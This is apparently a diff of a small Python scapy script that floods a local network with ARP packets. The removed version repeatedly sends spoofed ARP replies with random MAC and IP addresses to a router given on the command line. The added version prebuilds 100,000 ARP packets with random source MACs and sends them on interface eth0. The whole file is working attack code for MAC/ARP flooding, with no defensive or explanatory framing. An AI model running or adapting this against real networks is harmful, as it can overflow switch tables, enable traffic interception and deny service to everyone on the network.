@@ -1,26 +1,18 @@
 from scapy.all import *
 import sys
 
-def mac_flood(router_ip, router_mac):
-    bad_mac = ':'.join('%02x'%random.randint(0, 255) for x in range(6))
-    bad_ip = '.'.join(str(random.randint(0, 255)) for x in range(4))
-    packet = ARP(op = "is-at",
-                hwsrc = bad_mac,
-                psrc = bad_ip,
-                pdst = router_ip,
-                hwdst = router_mac)
-    send(packet, verbose=False)
+def mac_flood(packets):
+    sendp(packets, iface='eth0') # Send all packets on layer 2
+    print("Finished packet flood")
 
 def main():
-    router_ip = sys.argv[1]
-    router_mac = getmacbyip(router_ip)
+    num_of_packets = 100000
+    packets = []
 
-    try:
-        print("Flooding router at {}".format(router_ip, router_mac))
-        while True:
-            mac_flood(router_ip, router_mac
-            )
-    except KeyboardInterrupt:
-        print("\nEnding packet flood")
+    # Generate packets beforehand for faster transmission
+    for i in range(num_of_packets):
+        packets.append(ARP(hwsrc = RandMAC()))
+        
+    mac_flood(packets)
 
 main()
